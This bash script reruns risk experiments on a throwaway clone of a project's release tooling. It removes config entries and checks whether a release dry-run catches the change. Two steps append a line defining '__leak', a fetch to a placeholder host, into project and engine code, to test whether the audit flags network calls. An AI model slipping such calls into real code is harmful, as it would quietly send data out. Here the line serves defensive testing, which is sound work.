#!/usr/bin/env bash
# Stage C risk experiment, kept so a reviewer can repeat it. It was run in a throw-away clone in the session scratchpad: set SP to your own
# working folder (Node 24 tools on PATH; rx = a clone of e17560d with engineering/node_modules installed; v2 = the fresh clone of V2;
# base2bb = a clone of 2bb1737). Nothing here touches the real checkout. Output of the original runs: ../risk-experiments-raw.txt, ../pixel-flake-results.txt.
set -u
SP=${SP:?set SP to the working folder}
export PATH=$SP/n24/node_modules/.bin:$PATH STS_REQUIRE_AUDIT=1
cd $SP/rx/jade-and-ember
OUT=$SP/rx-results2.txt; : > $OUT
log(){ echo "$*" | tee -a $OUT; }
revert(){ git -C $SP/rx checkout -q -- . ; git -C $SP/rx clean -fdq -e engineering/node_modules -e jade-and-ember/engineering/.reports; }
dry(){ node ../engineering/checks/release-dryrun.mjs > $SP/$1.log 2>&1; echo "exit $?" | tee -a $OUT; grep -o "[0-9]*/[0-9]* scenarios as expected[^—]*" $SP/$1.log | tee -a $OUT; tail -1 $SP/$1.log | tee -a $OUT; }
log "## E1b: 'fonts' removed from delivery.assetFolders (3 scenarios need the capability)"
python3 - <<'PY'
import json
p='sts.engineering.json'; m=json.load(open(p)); m['delivery']['assetFolders']=[x for x in m['delivery']['assetFolders'] if x!='fonts']; json.dump(m,open(p,'w'),indent=2)
PY
dry e1b; revert
log "## E1c: fixtures.headTag removed (4 social-image scenarios need it)"
python3 - <<'PY'
import json
p='sts.engineering.json'; m=json.load(open(p)); m['fixtures'].pop('headTag',None); json.dump(m,open(p,'w'),indent=2)
PY
dry e1c; revert
log "## E3a: a network call added to a PROJECT check"
echo "export const __leak = () => fetch('https://example.invalid/leak');" >> engineering/checks/d11.mjs
dry e3a; revert
log "## E3b: the same call added to ENGINE (snapshot) code"
echo "export const __leak = () => fetch('https://example.invalid/leak');" >> ../engineering/lib/zip.mjs
dry e3b; grep -m3 "network\|fetch" $SP/e3b.log | cut -c1-220 | tee -a $OUT; revert
log "done"
